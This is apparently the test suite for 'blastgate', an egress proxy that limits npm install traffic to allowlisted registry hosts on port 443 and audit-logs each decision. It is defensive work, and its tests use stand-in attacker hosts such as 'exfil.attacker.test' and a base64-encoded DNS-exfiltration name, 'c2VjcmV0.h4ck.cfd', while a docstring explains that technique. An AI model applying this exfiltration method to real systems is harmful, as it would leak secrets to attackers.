"""Tests for the egress enforcement point.

These exercise the proxy over loopback with no container runtime involved. The
allowed-host path uses a local echo server as the upstream, with name
resolution patched, so tunnelling is demonstrated without reaching the network.
"""

import asyncio

import pytest

from blastgate.audit import AuditLog
from blastgate.policy import Policy
from blastgate.proxy import (
    DEFAULT_ALLOWED_PORTS,
    EgressProxy,
    MalformedRequestError,
    parse_connect_request,
)


@pytest.fixture
def policy():
    return Policy.from_dict({
        "ecosystem": "npm",
        "exact": [{"host": "registry.npmjs.org", "reason": "registry"}],
        "wildcard": [{"pattern": "*.npmjs.org", "reason": "cdn"}],
        "conditional": [
            {"host": "github.com", "condition": "git-dependencies", "reason": "git deps"}
        ],
    })


class TestRequestParsing:
    def test_valid_connect(self):
        target = parse_connect_request("CONNECT registry.npmjs.org:443 HTTP/1.1")
        assert target.host == "registry.npmjs.org"
        assert target.port == 443

    @pytest.mark.parametrize("line", [
        "GET http://evil.example.com/ HTTP/1.1",
        "POST http://evil.example.com/ HTTP/1.1",
        "PUT / HTTP/1.1",
        "connect registry.npmjs.org:443 HTTP/1.1",
        "CONNECTX registry.npmjs.org:443 HTTP/1.1",
    ])
    def test_non_connect_methods_refused(self, line):
        # Forwarding absolute-URI HTTP would mean parsing and rewriting
        # attacker-controlled requests. Registry traffic does not need it.
        with pytest.raises(MalformedRequestError):
            parse_connect_request(line)

    @pytest.mark.parametrize("line", [
        "",
        "CONNECT HTTP/1.1",
        "CONNECT registry.npmjs.org HTTP/1.1",
        "CONNECT registry.npmjs.org: HTTP/1.1",
        "CONNECT :443 HTTP/1.1",
        "CONNECT registry.npmjs.org:notaport HTTP/1.1",
        "CONNECT registry.npmjs.org:0 HTTP/1.1",
        "CONNECT registry.npmjs.org:99999 HTTP/1.1",
        "CONNECT registry.npmjs.org:443 HTTP/2.0",
        "CONNECT registry.npmjs.org:443",
    ])
    def test_malformed_refused(self, line):
        with pytest.raises(MalformedRequestError):
            parse_connect_request(line)

    def test_overlong_request_line_refused(self):
        with pytest.raises(MalformedRequestError):
            parse_connect_request("CONNECT " + "a" * 9000 + ":443 HTTP/1.1")


async def speak_to_proxy(proxy_port, request, payload=b""):
    """Send a raw request to the proxy and return the first response line."""
    reader, writer = await asyncio.open_connection("127.0.0.1", proxy_port)
    writer.write(request)
    await writer.drain()
    status = await asyncio.wait_for(reader.readline(), timeout=5)
    result = status.decode("latin-1").strip()
    body = b""
    if payload and result.startswith("HTTP/1.1 200"):
        while True:
            line = await asyncio.wait_for(reader.readline(), timeout=5)
            if line in (b"\r\n", b"\n", b""):
                break
        writer.write(payload)
        await writer.drain()
        body = await asyncio.wait_for(reader.read(len(payload)), timeout=5)
    writer.close()
    try:
        await writer.wait_closed()
    except (ConnectionResetError, BrokenPipeError):
        pass
    return result, body


def connect_request(host, port=443):
    return f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()


class TestEnforcement:
    @pytest.mark.asyncio
    async def test_denied_host_is_refused(self, policy, tmp_path):
        log = AuditLog(tmp_path / "audit.log")
        proxy = await EgressProxy(policy, audit_log=log).start()
        try:
            status, _ = await speak_to_proxy(
                proxy.bound_port, connect_request("exfil.attacker.test")
            )
            assert status == "HTTP/1.1 403 Forbidden"
        finally:
            await proxy.stop()

        entries = log.read_all()
        assert len(entries) == 1
        assert entries[0].host == "exfil.attacker.test"
        assert entries[0].allowed is False

    @pytest.mark.asyncio
    async def test_conditional_host_denied_without_opt_in(self, policy, tmp_path):
        log = AuditLog(tmp_path / "audit.log")
        proxy = await EgressProxy(policy, audit_log=log).start()
        try:
            status, _ = await speak_to_proxy(
                proxy.bound_port, connect_request("github.com")
            )
            assert status == "HTTP/1.1 403 Forbidden"
        finally:
            await proxy.stop()
        assert log.read_all()[0].allowed is False

    @pytest.mark.asyncio
    async def test_non_standard_port_refused_on_allowlisted_host(self, policy, tmp_path):
        # Policy strips the port and decides on hostname alone. Without the
        # port restriction here, an allowlisted host would be reachable on any
        # port at all.
        log = AuditLog(tmp_path / "audit.log")
        proxy = await EgressProxy(policy, audit_log=log).start()
        try:
            status, _ = await speak_to_proxy(
                proxy.bound_port, connect_request("registry.npmjs.org", port=8443)
            )
            assert status == "HTTP/1.1 403 Forbidden"
        finally:
            await proxy.stop()
        entry = log.read_all()[0]
        assert entry.allowed is False
        assert "port 8443" in entry.reason

    @pytest.mark.asyncio
    async def test_malformed_request_refused_and_not_logged(self, policy, tmp_path):
        # There is no trustworthy hostname to record, so nothing is recorded.
        log = AuditLog(tmp_path / "audit.log")
        proxy = await EgressProxy(policy, audit_log=log).start()
        try:
            status, _ = await speak_to_proxy(
                proxy.bound_port, b"GET http://evil.test/ HTTP/1.1\r\n\r\n"
            )
            assert status == "HTTP/1.1 400 Bad Request"
        finally:
            await proxy.stop()
        assert log.read_all() == []

    @pytest.mark.asyncio
    async def test_host_header_cannot_override_connect_target(self, policy, tmp_path):
        # The decision uses the CONNECT target only. A Host header naming an
        # allowlisted site must not launder a denied target.
        log = AuditLog(tmp_path / "audit.log")
        proxy = await EgressProxy(policy, audit_log=log).start()
        request = (
            b"CONNECT exfil.attacker.test:443 HTTP/1.1\r\n"
            b"Host: registry.npmjs.org\r\n\r\n"
        )
        try:
            status, _ = await speak_to_proxy(proxy.bound_port, request)
            assert status == "HTTP/1.1 403 Forbidden"
        finally:
            await proxy.stop()
        assert log.read_all()[0].host == "exfil.attacker.test"

    @pytest.mark.asyncio
    async def test_allowed_host_is_tunnelled(self, policy, tmp_path, monkeypatch):
        # Stand up a local echo server and point resolution at it, so the
        # tunnel is demonstrated without reaching the network.
        async def echo(reader, writer):
            data = await reader.read(1024)
            writer.write(data)
            await writer.drain()
            writer.close()

        upstream = await asyncio.start_server(echo, "127.0.0.1", 0)
        upstream_port = upstream.sockets[0].getsockname()[1]

        real_open = asyncio.open_connection

        async def fake_open(host, port, *a, **kw):
            # The client's own connection to the proxy passes through
            # untouched; only the upstream leg is redirected.
            if host == "127.0.0.1":
                return await real_open(host, port, *a, **kw)
            assert host == "registry.npmjs.org"
            return await real_open("127.0.0.1", upstream_port)

        monkeypatch.setattr("blastgate.proxy.asyncio.open_connection", fake_open)

        log = AuditLog(tmp_path / "audit.log")
        proxy = await EgressProxy(policy, audit_log=log).start()
        try:
            status, body = await speak_to_proxy(
                proxy.bound_port,
                connect_request("registry.npmjs.org"),
                payload=b"hello-through-the-tunnel",
            )
            assert status == "HTTP/1.1 200 Connection Established"
            assert body == b"hello-through-the-tunnel"
        finally:
            await proxy.stop()
            upstream.close()
            await upstream.wait_closed()

        entry = log.read_all()[0]
        assert entry.allowed is True
        assert entry.rule == "exact:registry.npmjs.org"

    @pytest.mark.asyncio
    async def test_every_decision_is_recorded(self, policy, tmp_path):
        log = AuditLog(tmp_path / "audit.log")
        proxy = await EgressProxy(policy, audit_log=log).start()
        try:
            for host in ("a.attacker.test", "b.attacker.test", "github.com"):
                await speak_to_proxy(proxy.bound_port, connect_request(host))
        finally:
            await proxy.stop()
        entries = log.read_all()
        assert [e.host for e in entries] == [
            "a.attacker.test", "b.attacker.test", "github.com"
        ]
        assert log.verify() is True


class TestResolutionOrder:
    """A denied hostname must never be resolved.

    This is what closes DNS-based exfiltration, and it is a property of
    ordering rather than of anything aimed at DNS. The install container has no
    resolver at all; the proxy resolves, from the CONNECT hostname. If it
    resolved before deciding, a payload could exfiltrate by encoding data into
    a hostname it never expects to reach - the query alone carries the data to
    a nameserver the attacker controls, and a 403 afterwards would be far too
    late.
    """

    @pytest.mark.asyncio
    async def test_a_denied_host_is_never_resolved(self, policy, tmp_path):
        resolved = []

        real_open = asyncio.open_connection

        async def recording_open(host, port, *a, **kw):
            resolved.append(host)
            return await real_open(host, port, *a, **kw)

        log = AuditLog(tmp_path / "audit.log")
        proxy = await EgressProxy(policy, audit_log=log).start()
        import blastgate.proxy as proxy_module
        original = proxy_module.asyncio.open_connection
        proxy_module.asyncio.open_connection = recording_open
        try:
            status, _ = await speak_to_proxy(
                proxy.bound_port, connect_request("c2VjcmV0.h4ck.cfd")
            )
            assert status == "HTTP/1.1 403 Forbidden"
        finally:
            proxy_module.asyncio.open_connection = original
            await proxy.stop()

        # The client's own connection to the proxy is loopback; nothing else.
        assert "c2VjcmV0.h4ck.cfd" not in resolved
        assert log.read_all()[0].allowed is False

    @pytest.mark.asyncio
    async def test_a_denied_port_is_never_resolved(self, policy, tmp_path):
        # The port check runs before policy, and before resolution too.
        resolved = []
        real_open = asyncio.open_connection

        async def recording_open(host, port, *a, **kw):
            resolved.append(host)
            return await real_open(host, port, *a, **kw)

        proxy = await EgressProxy(policy, audit_log=AuditLog(tmp_path / "a.log")).start()
        import blastgate.proxy as proxy_module
        original = proxy_module.asyncio.open_connection
        proxy_module.asyncio.open_connection = recording_open
        try:
            status, _ = await speak_to_proxy(
                proxy.bound_port, connect_request("registry.npmjs.org", port=8443)
            )
            assert status == "HTTP/1.1 403 Forbidden"
        finally:
            proxy_module.asyncio.open_connection = original
            await proxy.stop()
        assert "registry.npmjs.org" not in resolved


class TestDefaults:
    def test_only_https_is_permitted_by_default(self):
        assert DEFAULT_ALLOWED_PORTS == frozenset({443})

    def test_proxy_has_no_allow_path_of_its_own(self, policy):
        # The only allow decision comes from the policy engine.
        proxy = EgressProxy(policy)
        assert proxy.policy is policy
